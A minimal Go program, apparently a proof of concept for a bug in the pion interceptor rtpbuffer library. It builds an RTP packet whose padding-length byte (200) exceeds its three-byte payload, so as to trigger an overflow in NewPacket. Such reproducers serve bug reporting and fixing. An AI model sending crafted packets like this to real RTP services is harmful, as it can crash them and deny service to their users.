package main

import (
	"github.com/pion/interceptor/public/rtpbuffer"
	"github.com/pion/rtp"
)

func main() {
	pm := rtpbuffer.NewPacketFactoryCopy()
	overflowPayload := []byte{0, 1, 200}

	header := &rtp.Header{
		SequenceNumber: 2,
		Padding:        true, 
	}
	pm.NewPacket(header, overflowPayload, 1, 1)
}